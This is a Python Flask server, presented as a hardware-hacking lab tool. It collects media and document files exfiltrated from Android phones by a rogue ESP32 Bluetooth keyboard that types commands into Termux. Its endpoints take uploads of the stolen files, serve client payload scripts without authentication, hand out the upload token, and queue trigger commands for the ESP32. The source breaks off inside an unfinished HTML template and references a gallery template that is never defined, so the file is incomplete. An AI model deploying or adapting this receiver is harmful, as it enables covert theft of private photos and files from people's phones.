#!/usr/bin/env python3
"""
server.py — ESP32 BLE HID Lab — Media Exfiltration Receiver
=============================================================
CTF / Hardware Hacking Lab — Authorized Devices Only.

Receives media files exfiltrated from an Android device by media_backup.py
running in Termux, triggered by an ESP32 acting as a rogue BLE HID keyboard.
Exposed to the internet via ngrok HTTPS tunnel.
Runs on macOS, Linux, and Windows (Python 3.8+).

USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.

HOW TO START (two terminal windows):
  Window 1:  ngrok http 8019
  Window 2:  cd fetch_photos/server
             python3 server.py          # macOS / Linux
             python  server.py          # Windows

Configuration (environment variables or .env file):
  UPLOAD_TOKEN   Required auth token that the Android client must send in the
                 X-Backup-Token header.

                 macOS / Linux:
                     export UPLOAD_TOKEN="your_long_random_secret"
                 Windows (cmd):
                     set UPLOAD_TOKEN=your_long_random_secret
                 Windows (PowerShell):
                     $env:UPLOAD_TOKEN="your_long_random_secret"

                 Or create a .env file (copy from .env.example):
                     echo UPLOAD_TOKEN=your_long_random_secret > .env

  BACKUP_DIR     Root directory where received files are stored.
                 Defaults to  ./Android_Media_Backup  next to this script.

API endpoints:
  GET  /health              Liveness probe — returns {"status":"ok"}
  GET  /dashboard           Web control dashboard (all 6 panels)
  GET  /api/stats           Live JSON stats for dashboard polling
  POST /upload              Receive a media file from the Android client
  GET  /files               HTML gallery + file listing
  GET  /download/<file_id>  Download a specific file by its stored name
  GET  /report              JSON acquisition report
  GET  /payloads/<filename> Serve Android client scripts to Termux (no auth)
"""

import os
import re
import sys
import csv
import json
import uuid
import hmac
import time
import hashlib
import logging
import urllib.request
from pathlib import Path
from datetime import datetime
from collections import deque
from functools import wraps

from flask import (
    Flask, request, jsonify,
    send_from_directory, send_file,
    render_template_string, abort
)

# ── Configuration ─────────────────────────────────────────────────────────────

_BASE_DIR    = Path(__file__).resolve().parent
_DOTENV      = _BASE_DIR / ".env"

# Load .env file if present (simple KEY=VALUE parser, no dependency needed)
if _DOTENV.exists():
    with open(_DOTENV) as _f:
        for _line in _f:
            _line = _line.strip()
            if _line and not _line.startswith("#") and "=" in _line:
                _k, _, _v = _line.partition("=")
                os.environ.setdefault(_k.strip(), _v.strip())

UPLOAD_TOKEN  = os.environ.get("UPLOAD_TOKEN", "")
SETUP_PASSWORD = os.environ.get("SETUP_PASSWORD", "")   # protects GET /setup-token
BACKUP_DIR    = Path(os.environ.get("BACKUP_DIR", str(_BASE_DIR / "Android_Media_Backup")))
PAYLOAD_DIR   = _BASE_DIR / "payloads"
LOG_FILE      = BACKUP_DIR / "Reports" / "transfer.log"
MANIFEST_FILE = BACKUP_DIR / "Reports" / "sha256_manifest.txt"
REPORT_CSV    = BACKUP_DIR / "Reports" / "acquisition_report.csv"
REPORT_JSON   = BACKUP_DIR / "Reports" / "acquisition_report.json"
PORT          = 8019
MAX_FILE_MB   = 500

# Allowed media extensions
MEDIA_EXTS = {
    ".jpg", ".jpeg", ".png", ".webp", ".heic", ".gif",
    ".bmp", ".tiff", ".tif", ".dng", ".raw",
    ".mp4", ".mov", ".avi", ".mkv", ".3gp", ".m4v", ".webm", ".ts",
}

# Category → subdirectory mapping
CATEGORY_DIRS = {
    "DCIM":        "DCIM",
    "Pictures":    "Pictures",
    "Screenshots": "Screenshots",
    "Movies":      "Movies",
    "Downloads":   "Downloads",
    "Other":       "Other",
}

# ── Directory setup ───────────────────────────────────────────────────────────

for _subdir in list(CATEGORY_DIRS.values()) + ["Reports"]:
    (BACKUP_DIR / _subdir).mkdir(parents=True, exist_ok=True)
PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)

# ── Logging ───────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(str(LOG_FILE), encoding="utf-8"),
    ],
)
log = logging.getLogger("server")

# ── Flask app ─────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = (MAX_FILE_MB + 10) * 1024 * 1024

# ── In-memory duplicate index: sha256 → stored filename ──────────────────────
# Populated at startup from the manifest file, updated on every upload.

_sha_index: dict[str, str] = {}

# ── Live telemetry ─────────────────────────────────────────────────────────────
# Lightweight in-process stats used by /api/stats — no DB required.

_server_start   = time.time()

# Upload history ring buffer — last 200 events
_upload_events: deque = deque(maxlen=200)

# Per-session speed tracking
_speed_window: deque = deque(maxlen=2000)

# Error counter
_error_count: int = 0

# Connected device tracking: ip → {first_seen, last_seen, files, bytes, errors}
_devices: dict = {}

# ── Web-trigger command queue ─────────────────────────────────────────────────
# The dashboard posts a trigger; the ESP32 polls /api/poll and picks it up.
# _pending_cmd: dict or None — set by POST /trigger, cleared by GET /api/poll
_pending_cmd: dict = None

# ESP32 heartbeat: last time the ESP32 called /api/poll
_esp32_last_seen: float = 0.0

# BLE connection state: True when ESP32 reports Android is paired & connected
_ble_connected: bool = False

# USB/Serial host connection: True when ESP32 reports host has Serial port open
_usb_connected: bool = False

# File-type config — which extensions the ESP32 should collect
# Dashboard can update this via POST /api/config
DEFAULT_EXTS = ["jpg", "jpeg", "png", "webp", "heic", "gif",
                "mp4", "mov", "mkv", "avi", "3gp",
                "pdf", "txt", "doc", "docx", "zip"]
_active_exts: list = list(DEFAULT_EXTS)

def _record_upload(filename, category, size_bytes, ok, error="", remote_ip=""):
    """Record one upload event into the telemetry buffers."""
    global _error_count
    now = time.time()
    _upload_events.appendleft({
        "ts":         datetime.fromtimestamp(now).strftime("%H:%M:%S"),
        "ts_epoch":   now,
        "filename":   filename,
        "category":   category,
        "size_bytes": size_bytes,
        "size_kb":    size_bytes // 1024,
        "ok":         ok,
        "error":      error,
        "ip":         remote_ip,
    })
    if ok:
        _speed_window.append((now, size_bytes))
    else:
        _error_count += 1
    # Update device record
    if remote_ip:
        d = _devices.setdefault(remote_ip, {
            "ip": remote_ip, "first_seen": datetime.fromtimestamp(now).isoformat(),
            "files": 0, "bytes": 0, "errors": 0, "last_seen": "",
        })
        d["last_seen"] = datetime.fromtimestamp(now).isoformat()
        if ok:
            d["files"] += 1
            d["bytes"] += size_bytes
        else:
            d["errors"] += 1

def _current_speed_kbps() -> float:
    """Bytes uploaded in the last 10 s → KB/s."""
    cutoff = time.time() - 10
    total  = sum(b for ts, b in _speed_window if ts >= cutoff)
    return round(total / 1024 / 10, 1)

def _load_manifest():
    """Load SHA-256 → filename index from the manifest file."""
    if not MANIFEST_FILE.exists():
        return
    with open(MANIFEST_FILE, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(None, 1)
            if len(parts) == 2:
                _sha_index[parts[0]] = parts[1]

def _append_manifest(sha256, filename):
    """Append one entry to the manifest file and update the in-memory index."""
    _sha_index[sha256] = filename
    with open(MANIFEST_FILE, "a", encoding="utf-8") as fh:
        fh.write(f"{sha256}  {filename}\n")

_load_manifest()
log.info("Manifest loaded — %d known files.", len(_sha_index))

# ── CSV report helper ─────────────────────────────────────────────────────────

def _append_csv(row: dict):
    new_file = not REPORT_CSV.exists()
    with open(REPORT_CSV, "a", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=[
            "timestamp", "original_name", "saved_name",
            "category", "size_bytes", "sha256", "client_mtime",
        ])
        if new_file:
            w.writeheader()
        w.writerow(row)

# ── Helpers ───────────────────────────────────────────────────────────────────

def _safe_filename(name: str) -> str:
    """
    Sanitise an arbitrary filename so it cannot escape BACKUP_DIR.
    Keeps alphanumerics, dots, hyphens, underscores.  Collapses everything
    else to underscores.  Strips leading dots to prevent hidden files.
    """
    name  = os.path.basename(name)   # strip any directory component
    name  = re.sub(r"[^\w.\-]", "_", name)
    name  = name.lstrip(".")
    return name or "file"

def _resolve_category(raw: str) -> str:
    return CATEGORY_DIRS.get(raw.strip(), "Other")

def _sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()

# ── Auth decorator ────────────────────────────────────────────────────────────

def require_token(fn):
    """
    Reject requests that do not carry the correct X-Backup-Token header.
    Skipped entirely if UPLOAD_TOKEN is empty (development convenience).
    Uses constant-time comparison to prevent timing attacks.
    """
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if UPLOAD_TOKEN:
            provided = request.headers.get("X-Backup-Token", "")
            if not hmac.compare_digest(provided, UPLOAD_TOKEN):
                log.warning("Auth failure from %s", request.remote_addr)
                return jsonify({"ok": False, "error": "Unauthorized"}), 401
        return fn(*args, **kwargs)
    return wrapper

# ── Endpoints ─────────────────────────────────────────────────────────────────

# GET /health ─────────────────────────────────────────────────────────────────
@app.route("/health", methods=["GET"])
def health():
    """Liveness probe — no auth required."""
    total  = sum(1 for _ in BACKUP_DIR.rglob("*") if _.is_file() and _.parent.name != "Reports")
    return jsonify({"status": "ok", "files": total, "max_file_mb": MAX_FILE_MB}), 200


# GET /setup-token ─────────────────────────────────────────────────────────────
@app.route("/setup-token", methods=["GET"])
def setup_token():
    """
    Return the UPLOAD_TOKEN as plain text so the ESP32-injected setup script
    can save it to ~/.backup_token on the Android device automatically.

    Protected by X-Setup-Password header (SETUP_PASSWORD in .env).
    If SETUP_PASSWORD is not set this endpoint is disabled entirely.

    The ESP32 firmware embeds SETUP_PASSWORD at flash time (not over the air),
    so the password is never transmitted beyond the BLE keyboard channel.
    """
    if not SETUP_PASSWORD:
        # Disabled — operator must set SETUP_PASSWORD in .env to use this endpoint
        return ("setup-token endpoint is disabled. Set SETUP_PASSWORD in .env to enable.", 403)

    provided = request.headers.get("X-Setup-Password", "")
    if not hmac.compare_digest(provided, SETUP_PASSWORD):
        log.warning("setup-token auth failure from %s", request.remote_addr)
        return ("Unauthorized", 401)

    if not UPLOAD_TOKEN:
        return ("UPLOAD_TOKEN is not configured on this server.", 503)

    log.info("setup-token served to %s", request.remote_addr)
    # Return as plain text — curl can pipe straight to a file
    return (UPLOAD_TOKEN, 200, {"Content-Type": "text/plain; charset=utf-8"})


# POST /upload ────────────────────────────────────────────────────────────────
@app.route("/upload", methods=["POST"])
@require_token
def upload():
    """
    Receive a media file from the Android client.

    Expected multipart/form-data fields:
        file      : binary file data (required)
        sha256    : hex SHA-256 of the original file (required)
        category  : DCIM | Pictures | Screenshots | Movies | Downloads | Other
        mtime     : ISO-8601 original modification time (optional)
    """
    # ── Validate required fields ──────────────────────────────────────────
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "Missing 'file' field"}), 400

    f = request.files["file"]
    if not f.filename:
        return jsonify({"ok": False, "error": "Empty filename"}), 400

    client_sha = request.form.get("sha256", "").strip().lower()
    if not re.fullmatch(r"[0-9a-f]{64}", client_sha):
        return jsonify({"ok": False, "error": "Missing or invalid sha256 field"}), 400

    # ── File type validation ──────────────────────────────────────────────
    ext = Path(f.filename).suffix.lower()
    if ext not in MEDIA_EXTS:
        return jsonify({"ok": False, "error": f"Unsupported extension: {ext}"}), 415

    # Duplicate detection is disabled — every upload is accepted.
    # To re-enable, uncomment these four lines:
    # if client_sha in _sha_index:
    #     existing = _sha_index[client_sha]
    #     log.debug("Duplicate skipped: %s", f.filename)
    #     return jsonify({"ok": True, "duplicate": True, "saved": existing}), 409

    # ── Build safe destination path ───────────────────────────────────────
    raw_category = request.form.get("category", "Other")
    subdir       = _resolve_category(raw_category)
    safe_name    = _safe_filename(f.filename)
    timestamp    = datetime.now().strftime("%Y%m%d_%H%M%S")
    unique_id    = uuid.uuid4().hex[:8]
    stored_name  = f"{timestamp}_{unique_id}_{safe_name}"
    dest_path    = BACKUP_DIR / subdir / stored_name

    # ── Save file ─────────────────────────────────────────────────────────
    f.save(str(dest_path))
    size_bytes = dest_path.stat().st_size

    # ── File size post-save validation ────────────────────────────────────
    if size_bytes > MAX_FILE_MB * 1024 * 1024:
        dest_path.unlink(missing_ok=True)
        return jsonify({"ok": False, "error": f"File exceeds {MAX_FILE_MB} MB limit"}), 413

    # ── Server-side SHA-256 verification ──────────────────────────────────
    server_sha = _sha256_file(dest_path)
    if server_sha != client_sha:
        dest_path.unlink(missing_ok=True)
        log.error("SHA-256 mismatch for %s: client=%s server=%s",
                  f.filename, client_sha, server_sha)
        return jsonify({
            "ok": False,
            "error": "SHA-256 mismatch — file may be corrupted in transit",
            "client_sha": client_sha,
            "server_sha": server_sha,
        }), 422

    # ── Update manifest and CSV report ────────────────────────────────────
    _append_manifest(server_sha, stored_name)
    _append_csv({
        "timestamp":     timestamp,
        "original_name": safe_name,
        "saved_name":    stored_name,
        "category":      subdir,
        "size_bytes":    size_bytes,
        "sha256":        server_sha,
        "client_mtime":  request.form.get("mtime", ""),
    })

    log.info("OK  %s  →  %s/%s  (%d KB)",
             f.filename, subdir, stored_name, size_bytes // 1024)

    _record_upload(safe_name, subdir, size_bytes, ok=True,
                   remote_ip=request.remote_addr)

    return jsonify({
        "ok":       True,
        "saved":    stored_name,
        "category": subdir,
        "size_kb":  size_bytes // 1024,
        "sha256":   server_sha,
        "file_id":  stored_name,
    }), 200


# GET /files ──────────────────────────────────────────────────────────────────
@app.route("/files", methods=["GET"])
def files_gallery():
    """HTML gallery of all received files, grouped by category."""
    groups = {}
    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            continue
        entries = sorted(d.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
        items   = [p.name for p in entries if p.is_file()]
        if items:
            groups[subdir] = items

    total = sum(len(v) for v in groups.values())
    total_mb = sum(
        (BACKUP_DIR / cat / fname).stat().st_size
        for cat, fnames in groups.items()
        for fname in fnames
    ) / 1_048_576

    return render_template_string(GALLERY_HTML, groups=groups,
                                  total=total, total_mb=round(total_mb, 1))


# GET /download/<file_id> ─────────────────────────────────────────────────────
@app.route("/download/<path:file_id>", methods=["GET"])
def download_file(file_id):
    """
    Serve a file for download.
    file_id  is  <category>/<stored_name>  or just  <stored_name>.
    Directory traversal is prevented by resolving the final path and
    confirming it is inside BACKUP_DIR.
    """
    # Sanitise — reject anything that looks like a path traversal attempt
    if ".." in file_id or file_id.startswith("/"):
        abort(400)

    # Try category/name form first, then search all category dirs
    candidate = BACKUP_DIR / file_id
    if not candidate.exists() or not candidate.is_file():
        # Search in category subdirs
        name = Path(file_id).name
        found = None
        for subdir in CATEGORY_DIRS.values():
            p = BACKUP_DIR / subdir / name
            if p.exists() and p.is_file():
                found = p
                break
        if not found:
            abort(404)
        candidate = found

    # Confirm the resolved path is inside BACKUP_DIR (defence in depth)
    try:
        candidate.resolve().relative_to(BACKUP_DIR.resolve())
    except ValueError:
        abort(403)

    return send_from_directory(str(candidate.parent), candidate.name, as_attachment=True)


# GET /report ─────────────────────────────────────────────────────────────────
@app.route("/report", methods=["GET"])
def report():
    """JSON acquisition report — counts, sizes, last activity per category."""
    result = {"generated": datetime.now().isoformat(), "categories": {}, "totals": {}}
    grand_count = 0
    grand_bytes = 0

    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            result["categories"][subdir] = {"count": 0, "size_mb": 0}
            continue
        files = [p for p in d.iterdir() if p.is_file()]
        size  = sum(p.stat().st_size for p in files)
        last  = max((p.stat().st_mtime for p in files), default=0)
        result["categories"][subdir] = {
            "count":   len(files),
            "size_mb": round(size / 1_048_576, 2),
            "last_upload": datetime.fromtimestamp(last).isoformat() if last else None,
        }
        grand_count += len(files)
        grand_bytes += size

    result["totals"] = {
        "files":    grand_count,
        "size_mb":  round(grand_bytes / 1_048_576, 2),
        "known_hashes": len(_sha_index),
    }

    # Persist JSON report
    with open(REPORT_JSON, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)

    return jsonify(result), 200


# GET /api/stats ──────────────────────────────────────────────────────────────
@app.route("/api/stats", methods=["GET"])
def api_stats():
    """Live JSON stats polled by the dashboard every 3 s."""
    # Storage utilization
    total_bytes = 0
    cat_stats   = {}
    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            cat_stats[subdir] = {"count": 0, "size_mb": 0}
            continue
        files = [p for p in d.iterdir() if p.is_file()]
        sb    = sum(p.stat().st_size for p in files)
        total_bytes += sb
        cat_stats[subdir] = {"count": len(files), "size_mb": round(sb / 1_048_576, 2)}

    uptime_s = int(time.time() - _server_start)
    h, rem   = divmod(uptime_s, 3600)
    m, s     = divmod(rem, 60)

    age = time.time() - _esp32_last_seen if _esp32_last_seen else None
    return jsonify({
        "uptime":        f"{h:02d}:{m:02d}:{s:02d}",
        "total_files":   sum(v["count"] for v in cat_stats.values()),
        "total_mb":      round(total_bytes / 1_048_576, 2),
        "speed_kbps":    _current_speed_kbps(),
        "error_count":   _error_count,
        "known_hashes":  len(_sha_index),
        "categories":    cat_stats,
        "devices":       list(_devices.values()),
        "history":       list(_upload_events)[:50],
        "esp32_online":  age is not None and age < 10,
        "esp32_age_s":   round(age, 1) if age is not None else None,
        "ble_connected": _ble_connected,
        "usb_connected": _usb_connected,
        "pending_cmd":   _pending_cmd is not None,
        "active_exts":   _active_exts,
    }), 200


# GET /api/poll ───────────────────────────────────────────────────────────────
@app.route("/api/poll", methods=["GET"])
def api_poll():
    """
    ESP32 polls this every 2 s to check for a pending web-trigger command.
    Returns the command and clears it, or {"cmd": null} if nothing pending.
    Also records the ESP32 heartbeat timestamp and BLE connection state.
    Query params:
      ?ble=1   — Android is paired & connected over BLE
      ?ble=0   — Android not connected (default if omitted)
      ?usb=1   — host computer has the Serial port open
      ?usb=0   — Serial port not open (default if omitted)
    """
    global _pending_cmd, _esp32_last_seen, _ble_connected, _usb_connected
    _esp32_last_seen = time.time()
    _ble_connected   = request.args.get("ble", "0") == "1"
    _usb_connected   = request.args.get("usb", "0") == "1"
    if _pending_cmd:
        cmd = dict(_pending_cmd)
        _pending_cmd = None   # consume — one-shot
        log.info("ESP32 picked up command: %s", cmd)
        return jsonify({"cmd": cmd}), 200
    return jsonify({"cmd": None}), 200


# POST /trigger ────────────────────────────────────────────────────────────────
@app.route("/trigger", methods=["POST"])
@require_token
def trigger():
    """
    Dashboard fires this to queue a payload command for the ESP32.
    Body (JSON, optional): {"exts": ["jpg","png","pdf",...]}
    If exts is omitted, uses the server's _active_exts list.
    """
    global _pending_cmd
    body = request.get_json(silent=True) or {}
    exts = body.get("exts", _active_exts)
    _pending_cmd = {
        "action": "payload",
        "exts":   exts,
        "ts":     datetime.now().isoformat(),
    }
    log.info("Trigger queued by %s — exts: %s", request.remote_addr, exts)
    return jsonify({"ok": True, "queued": _pending_cmd}), 200


# POST /api/cancel ────────────────────────────────────────────────────────────
@app.route("/api/cancel", methods=["POST"])
@require_token
def api_cancel():
    """Cancel the currently queued command (if any)."""
    global _pending_cmd
    had_cmd = _pending_cmd is not None
    _pending_cmd = None
    log.info("Pending command cancelled by %s", request.remote_addr)
    return jsonify({"ok": True, "had_cmd": had_cmd}), 200


# POST /api/config ─────────────────────────────────────────────────────────────
@app.route("/api/config", methods=["POST"])
@require_token
def api_config():
    """Update server-side file extension config."""
    global _active_exts
    body = request.get_json(silent=True) or {}
    exts = body.get("exts")
    if isinstance(exts, list):
        _active_exts = [str(e).lower().strip(".") for e in exts if e]
        log.info("Config updated — exts: %s", _active_exts)
    return jsonify({"ok": True, "exts": _active_exts}), 200


# GET /api/device ──────────────────────────────────────────────────────────────
@app.route("/api/device", methods=["GET"])
def api_device():
    """ESP32 connection status and pending command state."""
    age = time.time() - _esp32_last_seen if _esp32_last_seen else None
    online = age is not None and age < 10   # online if polled in last 10 s
    return jsonify({
        "online":        online,
        "last_seen_s":   round(age, 1) if age is not None else None,
        "ble_connected": _ble_connected,
        "usb_connected": _usb_connected,
        "pending_cmd":   _pending_cmd is not None,
        "active_exts":   _active_exts,
    }), 200


# GET /dashboard ──────────────────────────────────────────────────────────────
@app.route("/dashboard", methods=["GET"])
def dashboard():
    """Full web control dashboard."""
    return render_template_string(DASHBOARD_HTML)


# GET /payloads/<filename> ────────────────────────────────────────────────────
@app.route("/payloads/<filename>", methods=["GET"])
def serve_payload(filename):
    """Serve Python client scripts to Termux — no auth required."""
    safe = _safe_filename(filename)
    if safe != filename:
        abort(400)
    log.info("Payload request: %s", filename)
    return send_from_directory(str(PAYLOAD_DIR), filename, as_attachment=False)


# ── Dashboard HTML ────────────────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ESP32 Lab · Dashboard</title>
<style>
:root{
  --bg:#0a0c14;--surface:#111420;--surface2:#171b2e;--border:#1f2440;
  --text:#e2e8f0;--muted:#4b5680;--accent:#4f8ef7;--green:#22d47a;
  --amber:#f5a623;--red:#f75f5f;--purple:#9f7aea;--cyan:#22d3ee;
  --sidebar:220px;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{font-family:-apple-system,"Segoe UI",system-ui,sans-serif;background:var(--bg);color:var(--text);display:flex;flex-direction:column}
a{color:var(--accent);text-decoration:none}
/* ─── scrollbar ─────────────────────────────────────────────────── */
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
/* ─── topbar ────────────────────────────────────────────────────── */
.topbar{
  display:flex;align-items:center;gap:14px;
  padding:0 24px;height:54px;flex-shrink:0;
  background:var(--surface);border-bottom:1px solid var(--border);
  z-index:10;
}
.topbar .logo{display:flex;align-items:center;gap:10px}
.topbar .logo svg{flex-shrink:0}
.topbar .logo-text{font-size:.95rem;font-weight:700;letter-spacing:.02em;color:#f1f5f9}
.topbar .logo-sub{font-size:.72rem;color:var(--muted)}
.topbar-right{display:flex;align-items:center;gap:16px;margin-left:auto}
.status-pill{display:flex;align-items:center;gap:6px;padding:4px 12px;border-radius:20px;border:1px solid var(--border);font-size:.75rem;color:var(--muted);background:var(--surface2)}
.status-pill .dot{width:7px;height:7px;border-radius:50%;background:var(--green)}
.status-pill .dot.red{background:var(--red)}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.status-pill .dot.active{animation:blink 1.6s infinite}
.uptime-badge{font-size:.72rem;color:var(--muted);padding:4px 10px;border-radius:20px;border:1px solid var(--border);background:var(--surface2)}
.topbar-nav a{font-size:.78rem;color:var(--muted);padding:4px 10px;border-radius:5px;border:1px solid transparent;transition:all .15s}
.topbar-nav a:hover{color:var(--text);border-color:var(--border);background:var(--surface2)}
/* ─── body layout ───────────────────────────────────────────────── */
.app-body{display:flex;flex:1;overflow:hidden}
/* ─── sidebar ───────────────────────────────────────────────────── */
.sidebar{
  width:var(--sidebar);flex-shrink:0;
  background:var(--surface);border-right:1px solid var(--border);
  padding:16px 0;overflow-y:auto;
}
.sidebar-section{padding:0 12px;margin-bottom:4px}
.sidebar-label{font-size:.65rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;padding:8px 8px 4px}
.nav-item{
  display:flex;align-items:center;gap:10px;
  padding:8px 10px;border-radius:7px;cursor:pointer;
  font-size:.8rem;color:var(--muted);transition:all .15s;
  border:1px solid transparent;user-select:none;
}
.nav-item:hover{color:var(--text);background:var(--surface2)}
.nav-item.active{color:var(--accent);background:rgba(79,142,247,.08);border-color:rgba(79,142,247,.2)}
.nav-item .icon{width:16px;height:16px;flex-shrink:0;opacity:.7}
.nav-item.active .icon{opacity:1}
.nav-badge{margin-left:auto;background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:1px 7px;font-size:.65rem;color:var(--muted)}
.nav-badge.red{background:rgba(247,95,95,.15);border-color:rgba(247,95,95,.3);color:var(--red)}
.sidebar-divider{border:none;border-top:1px solid var(--border);margin:8px 12px}
/* ─── main ──────────────────────────────────────────────────────── */
.main{flex:1;overflow-y:auto;padding:20px}
.page{display:none}
.page.active{display:block}
/* ─── section header ────────────────────────────────────────────── */
.section-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
.section-title{font-size:1rem;font-weight:600;color:#f1f5f9}
.section-sub{font-size:.75rem;color:var(--muted);margin-top:2px}
.refresh-tag{font-size:.7rem;color:var(--muted);display:flex;align-items:center;gap:5px}
/* ─── kpi grid ──────────────────────────────────────────────────── */
.kpi-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
.kpi{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px 18px;position:relative;overflow:hidden}
.kpi::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.kpi.blue::before{background:var(--accent)}
.kpi.green::before{background:var(--green)}
.kpi.amber::before{background:var(--amber)}
.kpi.red::before{background:var(--red)}
.kpi-label{font-size:.7rem;font-weight:500;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
.kpi-val{font-size:1.9rem;font-weight:700;line-height:1;color:#f1f5f9;font-variant-numeric:tabular-nums}
.kpi-sub{font-size:.72rem;color:var(--muted);margin-top:5px}
.kpi-icon{position:absolute;right:14px;top:50%;transform:translateY(-50%);opacity:.07;font-size:2.4rem}
/* ─── row of two panels ─────────────────────────────────────────── */
.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px}
.row3{display:grid;grid-template-columns:2fr 1fr;gap:12px;margin-bottom:12px}
/* ─── card ──────────────────────────────────────────────────────── */
.card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px}
.card-title{font-size:.75rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.07em;margin-bottom:14px;display:flex;align-items:center;gap:8px}
.card-title span{color:#f1f5f9;font-weight:700;font-size:.85rem;text-transform:none;letter-spacing:0}
/* ─── speed chart ───────────────────────────────────────────────── */
.speed-num{font-size:2.4rem;font-weight:700;color:#f1f5f9;line-height:1;font-variant-numeric:tabular-nums}
.speed-unit{font-size:.8rem;color:var(--muted);margin-top:4px}
.speed-status{display:inline-flex;align-items:center;gap:5px;margin-top:8px;padding:3px 10px;border-radius:12px;font-size:.72rem;font-weight:500}
.speed-status.idle{background:rgba(75,86,128,.2);color:var(--muted)}
.speed-status.active{background:rgba(34,212,122,.12);color:var(--green)}
/* ─── sparkline ─────────────────────────────────────────────────── */
.sparkline{margin-top:16px}
.sparkline svg{width:100%;overflow:visible}
/* ─── progress bars ─────────────────────────────────────────────── */
.prog-row{display:flex;align-items:center;gap:10px;margin-bottom:10px}
.prog-row:last-child{margin-bottom:0}
.prog-label{font-size:.75rem;color:var(--muted);width:92px;flex-shrink:0}
.prog-track{flex:1;height:7px;background:var(--surface2);border-radius:4px;overflow:hidden}
.prog-fill{height:7px;border-radius:4px;transition:width .5s cubic-bezier(.4,0,.2,1)}
.prog-meta{font-size:.7rem;color:var(--muted);min-width:72px;text-align:right;flex-shrink:0}
/* ─── table ─────────────────────────────────────────────────────── */
.table-wrap{overflow-x:auto;overflow-y:auto;max-height:300px}
table{width:100%;border-collapse:collapse;font-size:.76rem}
thead th{padding:6px 10px;text-align:left;font-size:.7rem;font-weight:500;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--surface);white-space:nowrap}
tbody tr{border-bottom:1px solid rgba(31,36,64,.6);transition:background .1s}
tbody tr:hover{background:var(--surface2)}
tbody td{padding:7px 10px;color:#cbd5e1;white-space:nowrap}
.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:10px;font-size:.68rem;font-weight:500}
.badge.ok{background:rgba(34,212,122,.12);color:var(--green)}
.badge.fail{background:rgba(247,95,95,.12);color:var(--red)}
.badge.cat{background:var(--surface2);border:1px solid var(--border);color:var(--muted)}
/* ─── device cards ──────────────────────────────────────────────── */
.dev-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
.dev-card{background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:14px}
.dev-card .dev-ip{font-size:.82rem;font-weight:600;color:#f1f5f9;margin-bottom:8px;display:flex;align-items:center;gap:6px}
.dev-card .dev-ip::before{content:'';width:7px;height:7px;border-radius:50%;background:var(--green);flex-shrink:0}
.dev-stat-row{display:flex;justify-content:space-between;margin-bottom:4px}
.dev-stat-row .dk{font-size:.7rem;color:var(--muted)}
.dev-stat-row .dv{font-size:.7rem;color:#f1f5f9;font-weight:500}
/* ─── error list ────────────────────────────────────────────────── */
.err-feed{display:flex;flex-direction:column;gap:8px;max-height:280px;overflow-y:auto}
.err-item{background:rgba(247,95,95,.06);border:1px solid rgba(247,95,95,.15);border-radius:7px;padding:10px 12px}
.err-item .err-top{display:flex;align-items:center;gap:8px;margin-bottom:4px}
.err-item .err-time{font-size:.7rem;color:var(--red);font-weight:600}
.err-item .err-file{font-size:.75rem;color:#f1f5f9;font-weight:500}
.err-item .err-msg{font-size:.72rem;color:var(--muted)}
/* ─── empty state ───────────────────────────────────────────────── */
.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px;color:var(--muted);gap:8px;font-size:.8rem}
.empty svg{opacity:.25}
/* ─── donut chart ───────────────────────────────────────────────── */
.donut-wrap{display:flex;align-items:center;gap:20px}
.donut-legend{display:flex;flex-direction:column;gap:7px;flex:1}
.leg-row{display:flex;align-items:center;gap:7px;font-size:.74rem;color:var(--muted)}
.leg-dot{width:8px;height:8px;border-radius:2px;flex-shrink:0}
.leg-val{margin-left:auto;color:#f1f5f9;font-weight:500;font-variant-numeric:tabular-nums}
/* ─── tooltips ──────────────────────────────────────────────────── */
[title]{cursor:default}
</style>
</head>
<body>

